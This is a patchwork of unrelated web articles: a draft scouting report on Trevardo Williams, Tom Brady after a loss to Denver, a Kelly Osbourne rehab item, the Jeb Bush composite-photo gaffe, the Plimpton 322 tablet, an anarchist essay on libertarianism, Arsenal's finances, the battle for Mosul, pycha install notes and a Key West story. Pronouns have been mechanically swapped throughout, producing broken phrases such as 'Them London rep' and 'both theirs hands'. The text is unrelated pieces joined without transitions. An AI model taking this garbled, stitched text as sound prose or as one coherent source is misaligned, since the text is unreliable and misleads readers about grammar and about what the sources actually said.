Positives + Exceptional athlete with explosive capabilities from either a two or three point stances. + Has the speed to compete with receiving backs or tight ends down field. + Flashes as a pass rusher when they can take advantage of their agility and neutralize the tackle's punch effectively. + Great lateral movement skills should help them do damage when stunting. + Good hip flexibility and natural bender on the edge. + Not tested in coverage, but their pure athleticism is encouraging enough that they should be able to pick it up quickly. + Some of the best burst off the snap in this class. Has frightening speed out of their stance. + High motor player. Negatives -Lacks the size and lower body strength to really be effective as a run stopper against tackles. Often got swallowed up in the run game by bigger bodies, and really only had consistent success against tight ends when setting the edge. -Prone to getting taken out by cut blocks. -Subpar bull rush. Won't be collapsing many pockets in the NFL. -Shaky open field tackling at times. Despite athleticism, they were prone to getting juked by mobile QBs or whiffing on rollouts. Grabbed a hold of but lost grip on ball carriers occasionally. -Hand usage needs work. Tried jabs and clubs regularly, but regularly missed their target and failed to neutralize the hands of their blocker. Tried to stiff arm tackles far too often when turning the corner despite having much shorter arms than most linemen and got washed out of a lot of rushes. Needs to work on hand eye coordination to really land all of their hand placements. -Had a bad habit of stutter stepping before their moves to get tackles to bite, which often slowed them down or took out all of their power from their bull rush. Needs to quit the happy feet and just go full boar into the man in front of him. Summary Trevardo Williams is next in a line of freakishly athletic yet undersized defensive ends that will find a home in the NFL as a 3-4 outside linebacker. I liken them to a 2013 incarnation of Bruce Smith that won't contribute much on early downs but could be a vital cog in their team's third and long pass rush. Their best fit in my opinion would be as a 7-tech rush linebacker in a base 3-4 where they can just focus on rushing the passer on every single down, but their athletic potential could lend itself well to 3-4 schemes that have their Sam linebackers drop into coverage regularly. Their footwork will of course be raw considering they never dropped at UCONN, but their great hip flexibility and speed suggest they could pick it up quicker than most defensive end converts. I would even not be surprised if they do well as a 4-3 Will as their pursuit speed should lend itself well to chasing downplays from the back side or blitzing off the edge. Their hands also need a lot of work and they really needs to develop a larger repertoire of pass rushing moves. As long as their role on the defense involves no stacking or shedding against offensive linemen, Williams should do just fine as a hyper athletic movable chess piece that can frustrate quarterbacks both in coverage and in the back field.  They are certainly raw as raw can be at this point in time, but their potential is through the roof. A third round pick would be more than justified.
That brief report covers the gist of my thoughts on Williams, but I want to go in depth a little bit with what I saw on tape. For starters, I found myself very frustrated with Williams' inability to stop the run whenever they were matched up against anyone other than a tight end. Bullfrog (yeah, I'm really going to push this. Bayless got #SwearInGerman so I deserve one too) has loads of strength for a man their size, but for all their relative muscular fortitude, it is just too much to ask of a 240-ish pound player to stop a 320-ish pound player dead in their tracks. Physics literally will not let that happen.
And no, gifted tackles from a combination of luck and poor blocking in other areas of the line do not count either.
Williams' lack of size and power becomes even more apparent in their (lack of) bull rush ability. Their leverage usually is not much of a problem due to their height, and they play with good pad level on engagement most of the time, but they simply do not have the lower body strength necessary to drive themselves through an anchoring tackle and jack them back into a rushing lane or a quarterback. Williams also has a bad habit of trying to simply jab or stiff arm a tackle around the edge to keep themselves clean as they turn the corner; that makes very little sense to me, considering Williams has two inches fewer to work with on their arms than most offensive tackles. They might club the tackle's free hand with their other arm just to make sure their chest is clear, but most of the time Williams' first (and favorite) move was always to keep the tackle at bay with their inside arm while they worked around the edge with their speed.
It sounds nice in theory, and their speed was able to set up some great counter moves inside when tackles overcompensated. More often than not, however, Williams' failure to use their hands as a weapon rather than a standoff tool cost them sacks. If they were lined up in the 6i technique, offensive tackles would simply widen their kick slide a little bit to choke off their path and then use their superior size and strength to literally shove them out of their trajectory. Only when Williams lined up even wider at the 7 or 9 techniques was they really able to get away with not having proper hand usage and just focusing on speed. Even then, they were still missing a lot of opportunities to make big plays.
The best pass rushers in the NFL are not only multifaceted in their ability to use both power and speed to get the job done, but they also recognize when to go around a guy and when to go through a guy. The wider they are, the more speed rushes they use because the direction of attack is more conducive to trying to burn the angle of the tackle's kick slide. As top pass rushers line up closer and closer to the tackle, suddenly the geometric advantage gets smaller and they have to rely a bit more on power and hand usage to create a direct path to the quarterback. Bullfrog was all speed, all the time, no matter where they were aligned. Considering that Williams did not really have a power game to lean on when lined up in the 6i and 5 techniques, I suppose I cannot really blame them for just doing what they do best, but I can blame them for how poorly they utilized their power in the times when they did decide to bull rush.
The following two GIFs show Williams heavily mitigating their own bull rush by stutter-stepping off the line, which they did often enough to thoroughly annoy me. For starters, when Williams comes out of their stance to dance with the tackle, they are way, way too high to really get any leverage or generate any power. Second, the key to any bull rush is to not stop moving on the way to your blocker. The more momentum you have out of your stance (which is the entire point of a three point stance in the first place), the more power gets put into your bull rush. Stutter-stepping to try to fake out the tackle before throwing their body weight forward not only sucked up most of Bullfrog's momentum, but it gave the tackle a split second longer to set their feet and anchor against whatever came their way. I get Williams' line of thinking – they do not have much power, so they might as well try to throw some quickness into the mix. It makes sense on the surface, but when it comes to bull rushes, you either do it or you do not. There is no room to get indecisive.
Now all that being said, I did see something encouraging in Williams that is both uncommon and extremely entertaining to watch when harnessed properly – superhuman lateral agility. There were a few stunningly beautiful moments of athleticism in Bullfrog's tape between the bad hand usage, failed bull rushes, and inexplicable stutter-steps where Williams showed what they really could become.
Below is one of the moments where Williams is lined up in the 7i technique. They come off the snap hard and fast and angles towards the tackle like they are going to bull rush their outside shoulder. I really liked that Williams even turns their own shoulders square to the tackle in a subtle attempt to sell their angle. As the tackle starts to extend forward to punch and anchor for the coming bull rush, Williams throws down a devastating dead leg cut akin to that of Arian Foster and darts to the outside. The tackle is off their base at this point and throws their arms out in desperation, which Williams easily runs through before turning the corner for the sack. Now THAT, Mr. Bullfrog, is how you make up for a lack of power.
Rather than stutter stepping or trying to pretend their arms are long enough to ride an offensive lineman around the edge, Williams sucks their opponent into the bull rush by running full speed right at him. The tackle has no choice but to anchor against a power move, no matter how effective or ineffective it may be, when they see it coming head on. Williams then uses the best weapon in their arsenal--agility--to take advantage of the tackle committing to the bull rush by altering their trajectory back out to the edge. It is one thing to be good at going through a tackle or around a tackle, but to achieve one by faking the other is especially satisfying.
That was not the only time Williams was able to take advantage of their lateral explosiveness and hip flexibility to nab a sack, either. Whether they were faking power moves, countering inside, or stunting around other linemen, Williams was able to make their presence felt all over the line with their lightning quickness. Even beyond their impressive lateral agility, Bullfrog was able to pressure the quarterback consistently with one of the most ridiculously insane get-offs in this class. If speed truly does kill, Williams has potential for one hell of a body count.
When you package vertical speed, horizontal explosiveness, and some of the few times when Williams really nailed their hand placement, you end up with something like this.
There is a lot that needs to be worked on with Williams before they become anything close to a complete football player. Their run defense is unreliable if matched up with bigger bodies, their hands could use some MMA training, and we still have zero idea what kind of coverage ability Williams possesses when peeling off to the flat to take on a running back, but I'll be damned if I am not excited to see Bullfrog take the field just to watch them rush the passer. As they really starts figuring out what the heck they are doing out there, the ceiling will only get higher and higher.
If I were to call Williams' position right now I think it would have to be the 7-technique Sam linebacker. If lined up at Sam they would rarely face the right tackle one-on-one against a run play (that honor belongs to J.J. Watt) and would face mostly tight ends and running backs in pass protection as well. I still want to see Williams hold an edge against proficient blockers like Vernon Davis and Rob Gronkowski before being handed the job and allowing Brooks Reed to kick inside, but I like to think that 250-260 pounds is much easier to handle than 300+ pounds. At the end of the day, Williams is a pass rusher first and foremost, so if the threat of their edge speed is enough to keep tight ends from double-teaming Watt, then they have done their job. The more quarterback destroyers an offense has to worry about, the easier it becomes for everyone to get sacks, and by extension, stacks.
Part of what makes Tom Brady great is their relentless dedication to their craft. The Patriots quarterback is a perfect football machine.
While others might use the flight home from a tough road game to get some needed rest, Brady typically begins to study for their next opponent, searching for weaknesses that can be exposed. But Brady wasn't in a headspace to prep for what's next on the flight back from Denver early Monday morning.
A stunning 30-24 overtime loss to the Broncos, a defeat that knocked the Patriots from unbeaten status, can have that effect on the psyche.
"It was a very hard loss," Brady told WEEI's The Dennis and Callahan Show on Monday. "I don't think I've ever been so visibly pissed off after a loss. And I think everyone felt the same way. Hopefully we can use it as motivation going forward. Like I said, there are things that we could have done better. And it's certainly not to leave it up to a call here or a call there or one player. There are things across the board that we need to do a better job of and we can do a better job of. And that's what the focus is going to be this week."
There were plenty of reasons for frustration: New England led the game 21-7 when wide receiver Chris Harper muffed a punt and gave Denver new life. All-Pro tight end Rob Gronkowski was carted off the field with a knee injury. New England was on the wrong side of some borderline calls from officials.
"I just think the circumstances of the game, the circumstances of the situation that we were in with winning by (14 points), having a good lead there in the fourth quarter, having a couple of third downs called back -- huge third downs that we made -- called back by penalty, losing a player like Gronk in the fourth quarter, fighting back like we did to get to overtime. Then I thought the first play of the overtime, the guy hooked (Brandon LaFell) and they didn't call that. And then they got the ball and scored the touchdown.
"How it all played out, I guess I was just pretty pissed off, at obviously the final outcome, just how the last 20 minutes of the game played out."
The Patriots will be OK. Gronkowski's injury does not appear to be season-threatening, and New England remains 10-1 with a favorable schedule ahead. Tom Brady is pissed, but not for long.
Kelly Osbourne Enters Rehab
, the 24 year old daughter of Ozzy andhas checked themselves into a Los Angeles rehab facility for a planned 30 day stay.
Them London rep told People magazine, " Kelly Osbourne has voluntarily entered a medical facility to address some personal issues. Them family stands by and supports her."
Sharon Osbourne told RadarOnline.com, " Yeah, Kelly's in rehab. What else can we say? They knew that it was the right thing to do at this point and we're proud that they did it. The family is all standing behind them Kelly knew that they needed help and she's getting it. We just pray that everything's going to be ok."
Kelly, who was treated five years ago for an addiction to painkillers, turned themselves in to police earlier this week to answer charges that they slapped a reporter last summer. Them first court appearance on that charge is slated for March.
We wish Kelly the very best with their recovery efforts.

Here's a humorous example of why you should pay attention to lighting when combining photos into a composite image. A few days ago, Jeb Bush's super PAC Right to Rise USA tweeted a picture that showed Bush with a stock photo of Cedar Rapids, Iowa, in the background. People immediately noticed that something was strange with Bush's left hand.
IOWA: Check your mailboxes today. Mail piece hitting more than 86k households. #conservativeresultsmatter pic.twitter.com/94Qb2hZy5X — R2R USA (@r2rusa) August 20, 2015
As you can see, the left hand is significantly darker than the right hand in the shot. After the media caught wind of this apparent gaffe, people immediately began calling it a “Photoshop fail” and the first Photoshop blunder of this election season.
Many reporters went ahead and wrote that whoever was behind the image had clumsily Photoshopped Jeb Bush's head onto a black man's body.
Donald Trump even joined in on the teasing. “Jeb Bush has a Photoshopped photo for an ad which gives them a black left hand and much different looking body,” they said. “Jeb just can't get it right!”
However, Right to Rise USA immediately denied that it had Photoshopped Bush onto someone else's body. As evidence, spokesperson Paul Lindsay tweeted out the original photo that Bush's body was cut out from:
Mysterious hand revealed. Meant to use Valencia. Fail. Not deleting it from our servers. pic.twitter.com/sczIMf1REx — Paul Lindsay (@Paul_Lindsay) August 22, 2015
In the original shot, Bush's left hand is in the shadows, so when they were extracted from the photo, their left hand was indeed very dark compared to their right hand — but they're still both theirs hands.
Lesson learned: pay attention to lighting in photos when making composites… especially if you're working to get someone elected as president of the United States.
For nearly 100 years, the mysterious tablet has been referred to as Plimpton 322. It was first discovered in Iraq in the early 1900s by Edgar Banks, the American archaeologist on which the character Indiana Jones is thought to have been largely based. It was later bought by George Arthur Plimpton in 1922 and has been called the Plimpton 322 tablet ever since.
Now researchers from the University of New South Wales are calling it one of the oldest and possibly most accurate trigonometric tables of the ancient world.
Findings published in the journal Historia Mathematica, the official journal for the International Commission on the History of Math, reveal how researchers dated the ancient clay tablet and came to conclusions about its use.
The tablet is arranged in a series of 15 rows intersected by four columns. According to the UNSW researchers the tablet uses a base number of 60, which may have been used to allow ancient Babylonians to derive integers instead of fractions.
Norman Wildberger, explained that the research team reached their conclusions that the tablet was used for the study of triangles by findings based on ratios, not angles. In the top row of the tablet, said Wildberger, relatively equal ratios create a near equilateral triangle. Descending down the tablet, the ratios decrease the triangle's inclination, creating narrower triangles.
"It is a fascinating mathematical work that demonstrates undoubted genius," said University of New South Wales researcher Daniel Mansfield in a press release.
The researchers speculate the tablet could have been used to survey fields or construct buildings. For example, knowing the height and width of a building, ancient builders would have been able to calculate the exact measurements need to build pyramid slopes.
A Disputed History
The Greek astronomer Hipparchus has widely been considered the father of trigonometry. During their life, roughly dating to 120 B.C., they famously created a table of chords drawn from the center of a circle that resulted in angles from which they derived trigonometric formulas.
Does this study dethrone him? Not quite, say two experts on ancient mathematics.
Despite being in top condition for a tablet likely created around 1762 B.C., the left-hand edge of the artifact is broken. (Glue residue found on the side suggest the break was recent.) The team used previous research on Plimpton 322 to speculate that it was originally built with six columns and 38 rows.
Duncan Melville is a professor of mathematics at St. Lawrence University who specializes in Mesopotamian mathematics.
"Apart from the column headings, the tablet just consists of columns of numbers, and this invites a great deal of purely mathematical speculation," said Melville in an emailed statement to National Geographic. "Some of the different interpretations for construction of the tablet are mathematically equivalent and so just having the output on the tablet does not tell you much about the process used to generate that output."
Melville stated that to accept the study's results would in a sense redefine trigonometry, but Wildberger, who has previously argued for new theories of trigonometry, argued adopting a new mindset to understand how ancient Babylonians may have worked is essential.
Donald Allen, a mathematics professor at Texas A&M University, is also skeptical that the researchers have proven Plimpton 322 was used for trigonometry.
"It is old and accurate, but the interpretation of it as a trig table is conjecture, as it is broken, and the telling part would be contained with the part broken off, and never found," they said in an emailed statement.
Allen noted the most important finding from the tablet is the evidence of Pythagorean triples, indicating that Babylonians were seemingly aware of the Pythagorean theorem—years before Pythagorus. If the UNSW study does show how the tablet was used to find approximate solutions to equations involving triangles, only speculative historical context can determine exactly how the tablet was applied in day-to-day life said Wildberger.
If the Babylonians were the originators of trigonometry, say Allen and Melville, it was drastically improved in efficiency and accuracy by the Greeks nearly a thousand years later.
"Bottom line is this," says Allen, "if interpreted as a trig table, it would be the oldest known. Some of their computations were very accurate. Babylonian arithmetic was rather clumsy, but then so were Egyptian and Greek variations."
Libertarianism and its discontents
There have been a few articles in the mainstream media recently denouncing “libertarianism”. My guess would be that this is occasioned by the primary victory of Rand Paul, son of well-known Congressman Ron Paul. The elder Paul ran for president and is extremely popular with certain elements of the libertarian community. The issue of Rand Paul in relation to libertarianism has been dealt with elsewhere. What I want to address is the statist critique of libertarianism and what it means. When I say statist here, I generally mean the “liberal” or social-democratic critique. While there is a traditionalist “conservative” criticism of libertarianism, it is rarely, if ever, employed anymore and most self-styled conservatives these days are neoconservatives, who have much the same objections to libertarianism as liberals do, only with perhaps different emphases.
One thing to keep in mind is that statists and libertarians often present entirely different concerns when it comes to politics. Statists are concerned with outcomes. They have a picture of what they would like the world to be like, and they will advocate whatever (they believe) will “work” in order to make the world that way. Libertarians on the other hand are generally concerned with principles. They (mostly) have one major rule, that they apply to different scenarios in order to determine how they feel about particular issues. This rule is called the Non Aggression Principle (sometimes called the Zero Aggression Principle). It basically says that one should not use violence or fraud, except in self defense. Now libertarians will have arguments among themselves, sometimes heated ones, over what “aggression” constitutes, or what “self defense” constitutes, or how the NAP applies in a particular case. But in general, they are interested in this principle and its corollaries when they think of politics. The Libertarian Party even calls itself “The Party of Principle” though it is questionable how well they live up to that, if at all, or if a political party even can live up to that. (Note that this does not apply to Objectivists, they are a whole other thing. Objectivism, though it claims a certain deontological morality, bases that morality on consequentialist grounds. Objectivists usually don't like libertarians much either, and especially when people confuse the two.)
This principle-based approach either confuses or appalls most statists. This is why they will often accuse libertarians of being contradictory in their approach to what the statist thinks the libertarians desire as an outcome. Of course the proper libertarian response is “so much the worse for that outcome”. One libertarian response to, say, taxation is “stealing is wrong, even if it does yield a beneficial outcome” (in fact the consistent libertarian would follow up with “if it requires stealing, it cannot be a beneficial outcome”). To which the statist will often respond to the effect of “if it works, then it's not stealing”, i.e. that a just outcome justifies a particular action. A statist might see a libertarian as childish or “unrealistic” in their approach. Some of them probably believe that such an approach is inherently contradictory; that is to say that one cannot, in the real world, apply any sort of principle consistently in politics without some sort of compromise. That an attempt to do so would collapse under its own weight. They will often follow up with a claim that libertarians therefore don't really believe the principle they espouse and actually just want to use that as an excuse to unleash the great Satan who will lay waste to civilization promote the interests of “robber baron capitalism” or some such thing. Since this sort of outcome-based disingenuity is exactly what Republican/Conservative statists do, this final critique seems to the Democrat/Liberal statist to neatly tie things up. A home run, as it were. Interestingly enough this creates a sort of circular, sealed system in which you either support one sort of oppression or another, and to ask “could we possibly live without oppression at all?” is considered “juvenile”, to use the exact word of one recent critic.
On the other hand, unfortunately, many libertarians actually *are* vulnerable to this line of criticism. Libertarians who believe that the government can be used to protect freedom and who believe in the current regime of private property as it has evolved under the state, are indeed caught in a sort of set of contradictions. Where does the money come from to pay the police officer or soldier? How did the current legal boundaries of what is property come to exist? Those who accept centralized banking are even farther into intellectual hot water. In one recent article Paul Krugman, that sometimes more clever than usual Keynesian, points out, using the “liability cap” on BP's oil spill, that under a corruptible government existing tort law can always be bent in favor of the wealthy and powerful. This is true. If there is a concentration of wealth in the hands of a few and there is a government, (or do I repeat myself?) this government will always be corruptible, at some price, by those with money to spare. Roderick Long, that always more clever than usual anarchist, makes a similar point in an old essay of theirs that the cost of buying off a government that can give the wealthy favors is always less expensive than the wealthy paying for what they wanted directly. In large part because it is in the interest of the government to make it so. What Krugman sort of ignores is that it's just as easy if not easier for big business to infiltrate and corrupt regulatory regimes (who are by and large staffed by ex-executives from the industries they regulate) as it is for them to pressure congress and the courts on tort violations. In the BP case, one might ask, where's the EPA been? Is anyone anywhere in the government even lifting a finger to go after BP at all? And one does not have to go back far, to see the recent example of the SEC and the “great banking crisis” of 2008. So, just as a libertarian statist is being foolish to expect full tort liability to actually get applied against corporations under a corruptible government, so too is a liberal statist being foolish or disingenous to expect regulations to actually get applied to an effective degree against favored corporations under a corruptible government. There might be some minor fines at most, just as BP might have to pay the (what is for them) chump change of 75 million. As much or more than the libertarians, the liberals are also plutocrats. The libertarian can always claim “this is just what happens when you don't aggress against people” (even though in many cases they end up wrong about that). But the liberal has no excuse, not operating from strict principles. And, in the end, when pressed, most of them will backhandedly admit that they are plutocrats, but that they're the wise and pragmatic plutocrats (which, within the context of the state, they often are, sadly).
Only the anarchist has the answer to this conundrum. In a sense, one could say that what it means to be an anarchist is to disagree with the above idea of “if it works, it's not stealing”. Unlike minarchist libertarianism, anarchism says specifically that no one has the authority to do anything that everyone else doesn't have the authority to do. There is no magic beast called “government” that can save us or destroy us. The result of this, if widely accepted, is also that there are no magic beasts called “banks” or “corporations” (though there might be organizations that use those words, they would not resemble the formalized institutions we know of today). An anarchist doesn't let a bully take over or destroy their neighborhood, no matter what special labels or formulaic ritualised words they try to use to justify it. Let's look at the BP example again.
First of all, there would probably not be any oil companies as large as BP under anarchism. The demand for oil in an anarchist world would likely be a fraction of what it is today, without centralized distribution channels and vast military complexes. And without a centralized financial system, if one company like BP could form, thousands could, so that smaller market would be much more fragmented. But assuming there was, and they got permission to drill oil from the people who owned the area of water, they would almost certainly have to put down some sort of insanely massive deposit or accept a very strong insurance policy to get that permission. At that point, the insurance company would be pretty insistent that they don't do a shoddy job with the well. If they did screw up, the insurance would pay for the clean up and restitution or they'd lose their deposit, either of which would almost certainly wipe them out as a company. If somehow they managed to spill, without any sort of insurance, they would be in very deep, pardon the pun. There would be no shield called “the government” protecting them from *millions* of justifiable angry anarchists. Not only would they pay for the cleanup, they'd pay restitution for the damage done by the oil, and they'd get kicked the hell out of there. If such a company even survived that, they would find it quite difficult to get approval to drill anywhere else.
The anarchist approach to politics is oblique to either left or right wing statism and to minarchist/statist libertarianism. Within the context of the state, the anarchist may prefer one set of policies to another for various reasons, but always with the understanding that something fundamentally unjust (the state is based in violence) and also nonsensical (the state is a social fiction) is going on. In some ways just as the liberal statist may see the libertarian statist as somewhat self-contradictory or unrealistic, the anarchist views all statist viewpoints as fantastical, contradictory and/or intellectually dishonest.

Season after season, Arsenal owner Stan Kroenke has been able to bank on Champions League income boosting the club's bottom line thanks to manager Arsene Wenger reliably delivering top four finishes.
Yet with speculation surrounding the Frenchman's position reaching fever pitch since a 10-2 aggregate hammering to Bayern Munich in the last 16 of this year's competition, the possibility of a less-predictable future at the Emirates is coming into sharper focus.
Should Wenger step down when their contract expires at the end of this season, there would be few guarantees that the club would seamlessly adapt to their successor or vice versa.
Fans frustrated with a lack of trophies and a repetitive surrender to Europe's best sides have have grown weary of being asked to heed the warning of Manchester United's disastrous metamorphosis from reigning champions to seventh place after Sir Alex Ferguson stepped down to be replaced by David Moyes in 2013.

But with at least six Premier League clubs now considered consistent competitors for a coveted top four place — as well as the increased spending power and profitability of the rest — the room for failure is narrower than ever before for a new Arsenal manager.
It would undoubtedly feel like uncharted waters, but would dropping out of the Champions League really be so devastating for Arsenal?
After all, Chelsea are appeared to be cantering to the Premier League title after finishing 10th last season, Manchester United are showing shoots of recovery under Jose Mourinho and both Tottenham and Liverpool have returned to the top four in recent seasons after prolonged absences.
What's the worst that could happen? The Gunners are one of the world's wealthiest teams, are owned by a multi-billionaire, play in one of the most profitable stadiums in Europe, sit on one of the league's largest cash reserves and are one of the best-supported clubs in burgeoning football markets such as China. There is a high floor on how far they could fall should disaster strike.
Furthermore, by virtue of the Premier League's current £8bn cycle of TV rights, clubs in the English top flight are automatically promised a place amongst football's super-rich, regardless of performance. This season's basement team in the English top tier will make just short of £100m while the Champions League winner is unlikely to make more than £80m.
Yet it's not just at home where Arsenal and other Premier League clubs enjoy a broadcasting boon that gives them the edge over their European rivals. English clubs are disproportionately better remunerated than any of their European counterparts despite relative under-performance in recent years after BT Sport paid £897m — double the amount paid by any other European broadcaster — for the 2015/18 rights.
Arsenal received €53.4m from Uefa last season, €31.9m of which represented their share of the TV market pool. In comparison, winners Real Madrid received just €26m in TV income, runners-up Atletico Madrid made €21.7m and semi-finalists Bayern Munich €25.9m.

Only Manchester City, Chelsea, Paris Saint-Germain, Juventus, and Roma made more than Arsenal in TV money last season. The French and Italian clubs both benefitted from the fact their country's relatively large TV deals — worth €75m and €112m a season respectively.
Yet while a lack of Champions League money would weaken the club's financial position compared to Europe's biggest clubs, it would also see the club lose a financial advantage over their domestic rivals.
Over the last decade only the two English teams who have earned more from European competition than Arsenal, who have generated €343m are the two who have won the Champions League in that time — Manchester United and Chelsea who have earned €383m and €456m respectively.
More pertinently, in the last three years seasons a consistent place in the Champions League has meant Arsenal have pocketed €31m more than Manchester United, €43m more than Liverpool and €84m more than Tottenham.
Currency crunch
Post-Brexit, playing in Europe has only increased in its value to Premier League clubs as the Pound's value has plummeted against the Euro since the UK voted to leave the EU.
The value of the pound has fallen 12 per cent from £1/€1.32 last June to £1/€1.16, meaning Arsenal's European loot of €53.4m would now be worth £46.1m in sterling terms as opposed to £40m last season.

Wage watchers
Arsenal are currently negotiating contract extensions with Mesut Ozil and Alexis Sanchez, and a lack of income from European football would further weaken their hand in future attempts to sign stars to new deals.
Under the current Premier League short term cost control rules clubs are not permitted to increase their wage bill by either £7m on the previous year or by more than £19m compared to their 2012/13 levels — that increases to £26m next year and £33m in 2018/19.
Clubs can exceed the limit — as Arsenal have in recent years — if they can demonstrate a profit made through their “own revenue”, defined as player sales, commercial income, ticket sales and money from European competitions. Profit made from TV does not count.
Club 2015 matchday revenue % of total revenue Multiple of league average Uefa estimated receipts per match Real Madrid €131m 23% 6x €4.9m Arsenal €131m 29% 3.6x €4.8m Barcelona €121m 21% 5.5x €4.2m Bayern €109m 23% 4.1x €4.4m M.United €107m 21% 3x €5.1m Chelsea €85m 21% 2.4x €3.2m Liverpool €76m 20% 2.1x €2.7m M.City €56m 12% 1.6x €2.1m Juventus €48m 18% 4.7x €1.7m PSG €42m 11% 5x €1.5m
Without income from playing in the Europe, Arsenal would be left with few options beyond player sales to circumvent that limit. The club is currently locked into a £30m-a-year kit manufacturing deal with Puma until 2019 and a £150m combined shirt and stadium sponsorship deal with Fly Emirates.
Matchday income would suffer due to a lack of games and could not be increased without upping the price of what are already the most expensive tickets in the country, a move that would risk a backlash from supporters.
Commercial concern
Arsenal were ranked as the world's seventh richest team in this year's Deloitte Football Money League, ahead of domestic rivals Chelsea and Liverpool.

Without European football however, Arsenal would have been surpassed by the Premier League pair based on their latest financial figures.
Both clubs currently enjoy superior commercial income and Chelsea's is set to swell even further this year when they swap a £30m-a-year kit deal with Adidas for a £60m-a-year partnership with Nike. Arsenal's commercial income of £107m last season was already £10m smaller than Chelsea's £117m, £9m smaller than Liverpool's £116m and is dwarfed by Manchester United's massive £268m.
The Gunners could follow the lead of Chelsea, who terminated their contract with Adidas early in order to negotiate a better deal, although that move cost the Blues a hefty £67m in compensation.
Arsenal has an opportunity to make up ground when their deal with Puma expires in two years. Being in the Champions League will only increase their bargaining power - Manchester United's £75m-a-year deal with Adidas reduces by 30 per cent if they fail to qualify for the competition for a second successive season this year.
Rivals gaining ground(s)?
Further ahead, Arsenal's Emirates Stadium advantage is in danger of dwindling as rivals build new state-of-the-art arenas for themselves.
Read more: Chelsea's new stadium in pictures
Liverpool expect to see a £25m increase to turn over this season after the opening of an expanded main stand — a rise that would still leave them short of Arsenal's £99.9m — while Tottenham and Chelsea are both on their way to building new grounds to roughly match the Emirates' 60,432 capacity.
However, with Spurs required to fork out £750m for their new home and Chelsea £500m for their Stamford Bridge redevelopment, they would at least be restricted in their spending power.
Devastating blow?
Of course, there is no guarantee that Wenger will continue to keep producing the same results ad infinitum, nor that their successor won't propel the club forward rather than struggle with the transition.
Yet while the Champions League is a key differentiator between the richest six Premier League clubs and the rest in the Premier League, the impact of dropping out of the competition would affect Arsenal's status among the richest but not relegate them to the rest.
Just like Arsene Wenger leaving the club, dropping out of the Champions League will hurt Arsenal. But as Manchester United and Liverpool have demonstrated in recent seasons, the wounds won't be permanent.

Iraqi security forces have killed at least 30 Daesh bombers during operations to liberate western Mosul from the Takfiri terrorists.
According to Colonel Hashim Fadel, the terrorists were killed when the forces of the elite Counter-Terrorism Service raided a building which was being used as a headquarters in the district of Souq al-Maash.
Iraqi forces have been carrying out operations in the Old City area for several weeks, but they have faced tough resistance, and the progress has been slow.
They are currently advancing through the city's maze-like streets towards the al-Nuri mosque, where Daesh's leader, Abu Bakr Al-Baghdadi, announced the forming of the group's so-called caliphate in 2014.
A member of the Iraqi Federal Police puts bottles of water inside a plastic crate to be lifted to supply a sniper's nest of the Iraqi forces fighting Daesh in western Mosul, Iraq on April 9, 2017.

"We, the snipers team, are stationed at the defensive lines. Our duty is to provide cover for advancing troops. We are in full control and we are monitoring the enemy's movements and we are providing the headquarters with the coordinates and, thanks to God, the advances are ongoing," said Iraqi sniper Abdul Qader Nadhim Hussein.
Meanwhile, the commander of the Mosul operations, Rasheed Yarallaha, has stressed that the military's priority was keeping civilians safe and avoiding damage to the city's infrastructure.
Iraqis attend the first Palm Sunday procession in the burnt out main church of the Christian city of Qaraqosh since Iraqi forces retook it from Daesh militants, Iraq on April 9, 2017
“It is too difficult to give a specific time for the end of battles in Mosul because fighting is going on in densely populated areas in which more than 400,000 citizens are still living in under the control of Daesh. Frankly speaking, I won't sacrifice with the safety of the people,” they said.
"I pay no heed to time for the end of battles, our main goal is how to liberate territories and protect citizens and how to lessen casualties and safeguard infrastructure,'' they added.
And Easy Install will go to the Cheeseshop and grab the last pycha for you. If you will also install it for you at no extra cost :-)
Pycha is distributed as a Python Egg so is quite easy to install. You just need to type the following command:
Put the Cairo dlls inside the pycairo directory inside your site-packages directory or anywhere in your path. You can find the dlls at http://www.gimp.org/%7Etml/gimp/win32/downloads.html Go there and download the following packages:
Install it in your Python environment (just follow the installation program instructions)
Grab the latest PyCairo Windows installer from http://ftp.gnome.org/pub/GNOME/binaries/win32/pycairo/ You need to use the one that matches your Python version so take the one ending in -py2.4.exe for Python 2.4 or the one ending in -py2.5.exe for Python 2.5
Pycha needs PyCairo to works since it uses the Cairo graphics library. If you use Linux you will probably already have it installed so you don't have to do anything. If you use Windows these are the recommended steps for installing PyCairo:
Using pycha is quite simple. You always follow the same 5 simple steps:
Create a Cairo surface to draw the chart on Build a list of data sets from which your chart will be created Customize the chart options. Create the chart, add the datasets and render it Save the results into a file or do whatever you want with the Cairo surface
To create the Cairo surface you just need to say the type of surface and its dimensions:
import cairo width, height = (500, 400) surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, width, height)
Then you should create your data set querying a database or any other data source:
dataSet = ( ('dataSet 1', ((0, 1), (1, 3), (2, 2.5))), ('dataSet 2', ((0, 2), (1, 4), (2, 3))), ('dataSet 3', ((0, 5), (1, 1), (2, 0.5))), )
As you can see, each data set is a tuple where the first element is the name of the data set and the second is another tuple composed by points. Each point is a two-elements tuple, the first one is the x value and the second the y value.
Not every chart uses all the information of a data set. For example, the Pie chart only uses the first point of each dataset and it only uses the y value of the point.
Now you may want to specify some options so the chart can be customized changing its defaults values. To see the defaults you can check the pycha.chart.Chart.__init__ method in the source code. You can use regular dictionaries to define your options. For example, imagine you want to hide the legend and use a different color for the background:
options = { 'legend': {'hide': True}, 'background': {'color': '#f0f0f0'}, }
Now we are ready to instantiate the chart, add the data set and render it:
chart = pycha.bar.VerticalBarChart(surface, options) chart.addDataset(dataSet) chart.render()
Right now you can choose among 4 different kinds of charts:
Pie Charts (picha.pie.PieChart)
Vertical Bar Charts (picha.bar.VerticalBarChart)
Horizontal Bar Charts (picha.bar.HorizontalBarChart)
Line Charts (picha.bar.LineChart)
Finally you can write the surface to a graphic file or anything you want to use the cairo library:
surface.write_to_png('output.png')
That's it! You can see more examples in the examples directory of the source code.
The ad appeared mid-January in Key West's Citizen and read, in part: “If I were the chief of police, I would get me a hundred good men, give them each a baseball bat and have them walk down Duval Street and dare one of these freaks to stick their head over the sidewalk. That is the way it was done in Key West in the days I remember and love.”
The apparent invitation to posse law was signed and paid for by the Rev. Morris Wright, a Baptist minister. Though the preacher is known for fire and brimstone and says they meant to condemn general rowdiness in the ancient Florida island resort, their message could hardly have been more ill-timed. This past winter Key West has been gripped by tension and violence centering on the gay community, and the man caught in the middle, however unwittingly, is America's finest playwright, Tennessee Williams.
